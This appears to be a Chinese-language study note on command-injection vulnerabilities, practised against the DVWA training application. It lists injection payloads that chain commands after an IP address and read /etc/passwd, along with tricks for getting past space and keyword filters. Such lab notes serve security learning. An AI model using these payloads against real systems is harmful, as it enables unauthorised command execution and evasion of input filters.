# 网安实操｜命令注入漏洞笔记
---

### 1. 基础Payload测试
```bash
# 无条件执行
127.0.0.1; whoami
# 条件执行（成功才走）
127.0.0.1 && id
# 条件执行（失败才走）
127.0.0.1 || ls /
# 管道符传递
127.0.0.1 | cat /etc/passwd
2. 常见绕过场景
 
- 空格过滤绕过：用 $IFS / ${IFS} / %09 （Tab符）替代空格 
127.0.0.1;ls$IFS
127.0.0.1&&cat%09/etc/passwd
- 关键词过滤绕过：字符拆分/反引号变形
127.0.0.1 && who''ami
127.0.0.1 && who`ami`
3. DVWA命令注入复现步骤
 
1. 访问DVWA Command Injection模块（high级别）(low级别基本没有防护，medium:限制了&&,可以用其他代替)

2. 输入 127.0.0.1 && whoami ，验证命令执行

3. 尝试空格过滤绕过，使用 $IFS 替代空格

4. 尝试关键词过滤绕过，使用字符拆分变形Payload
